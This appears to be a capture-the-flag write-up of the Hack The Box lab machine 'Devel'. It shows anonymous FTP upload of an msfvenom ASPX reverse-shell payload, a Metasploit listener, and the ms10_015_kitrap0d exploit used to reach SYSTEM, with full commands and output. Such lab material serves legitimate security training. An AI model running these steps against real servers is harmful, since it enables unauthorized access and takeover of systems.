<center><h1>Devel</h1></center>
<br>
<center><h3>Summary</h3></center>
<br><br>
- Use an Anonymous FTP login with write permission to upload a shell
- Use <b>ms10_015_kitrap0d</b> to escalate priveleges to root
<br><br>
First thing is always an Nmap scan

```
# Nmap 7.70 scan initiated Thu May 30 12:00:56 2019 as: nmap -sV -sC -T4 -oN DevelNmap 10.10.10.5
Nmap scan report for 10.10.10.5
Host is up (0.043s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
| ftp-syst:
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu May 30 12:01:12 2019 -- 1 IP address (1 host up) scanned in 16.12 seconds
```
Only two ports open but I do see that there is Anonymous login allowed on FTP.
```
# ftp 10.10.10.5
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp>
```
If we list the files inside the directory we see a few files. From the looks of them it seems to be the default files for an IIS installation.
```
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
```
We can confirm this by navigating to <b>http://10.10.10.5</b>

<center><img src="/htb/devel/welcome.png"></center>
<br>
Now I know the files from the FTP can be directly accessed from the Web page. I decide to check if I have write privileges to the FTP server so I could upload a reverse shell. I test this by upload a test file
```
ftp> put test.txt
local: test.txt remote: test.txt
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
967 bytes sent in 0.00 secs (1016.5081 kB/s)
```
If I go back to the wepage and navigate to <b>test.txt</b> we see my file

<center><img src="/htb/devel/test.png"></center>
<br>
I am going to use msfvenom to create the payload for the reverse shell
```
# msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f aspx > shell.aspx

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 341 bytes
Final size of aspx file: 2798 bytes
```
I put the shell onto the sytem using FTP
```
ftp> put shell.aspx
local: shell.aspx remote: shell.aspx
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
2834 bytes sent in 0.00 secs (31.0657 MB/s)
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
09-23-19  03:42AM                 2834 shell.aspx
09-23-19  03:35AM                    9 test.txt
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
```
Now we need to set up our listener. Metasploits's <b>exploit/multi/handler</b> will be used for this
```
msf5 exploit(multi/handler) > set lhost 10.10.14.21
lhost => 10.10.14.21
msf5 exploit(multi/handler) > set lport 4444
lport => 4444
msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.21:4444
```
Now in the web page, navigate to <b>http://10.10.10.5/shell.aspx</b>

<center><img src="/htb/devel/shell.png"></center>
<br>
Now if we check the listener we should have a meterpreter shell. Checking the user we will see that we have a low privilege shell
```
[*] Started reverse TCP handler on 10.10.14.21:4444
[*] Sending stage (179779 bytes) to 10.10.10.5
[*] Meterpreter session 1 opened (10.10.14.21:4444 -> 10.10.10.5:49157) at 2019-09-19 08:49:29 -0400

meterpreter > getuid
Server username: IIS APPPOOL\Web
```
Next step is to run the <b>local_exploit_suggester</b>
```
meterpreter > run post/multi/recon/local_exploit_suggester

[*] 10.10.10.5 - Collecting local exploits for x86/windows...
[*] 10.10.10.5 - 29 exploit checks are being tried...
[+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The target service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms15_004_tswbproxy: The target service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms16_016_webdav: The target service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The target service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
```
We get tons of suggestions but the one I am going to use is <b>ms10_015_kitrap0d</b>. The reason I chose this one is because I have used it before and know that it works

Now we background the current <b>meterpreter</b> session so we can load in the <b>ms10_015_kitrap0d</b> exploit.
```
meterpreter > background
[*] Backgrounding session 1...
msf5 exploit(multi/handler) > use exploit/windows/local/ms10_015_kitrap0d
msf5 exploit(windows/local/ms10_015_kitrap0d) > set session 1
session => 2
msf5 exploit(windows/local/ms10_015_kitrap0d) > set lhost tun0
lhost => tun0
msf5 exploit(windows/local/ms10_015_kitrap0d) > set lport 5555
lport => 5555
msf5 exploit(windows/local/ms10_015_kitrap0d) > exploit

[*] Started reverse TCP handler on 10.10.14.21:5555
[*] Launching notepad to host the exploit...
[+] Process 2140 launched.
[*] Reflectively injecting the exploit DLL into 2140...
[*] Injecting exploit into 2140 ...
[*] Exploit injected. Injecting payload into 2140...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (179779 bytes) to 10.10.10.5
[*] Meterpreter session 3 opened (10.10.14.21:5555 -> 10.10.10.5:49161) at 2019-09-19 09:10:29 -0400

meterpreter>
```
Now we have a new <b>meterpreter</b> shell and if we do <b>getuid</b> it will show that we are <b>NT AUTHORITY SYSTEM</b>
```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
Now we grab both flags. To do this type <b>shell</b> so we can get a windows shell.
```
meterpreter > shell
Process 3584 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\windows\system32\inetsrv>
```
The user flag is located in <b>C:\Users\babis\Desktop</b>
```
Directory of C:\Users\babis\Desktop

18/03/2017  02:14     <DIR>          .
18/03/2017  02:14     <DIR>          ..
18/03/2017  02:18                 32 user.txt.txt
              1 File(s)             32 bytes
              2 Dir(s)  24.452.411.392 bytes free
```
The root flag is located in <b>C:\Users\Administrator\Desktop</b>
```
Directory of C:\Users\Administrator\Desktop

18/03/2017  02:17     <DIR>          .
18/03/2017  02:17     <DIR>          ..
18/03/2017  02:17                 32 root.txt.txt
              1 File(s)             32 bytes
              2 Dir(s)  24.452.411.392 bytes free
```
<br><br><br>
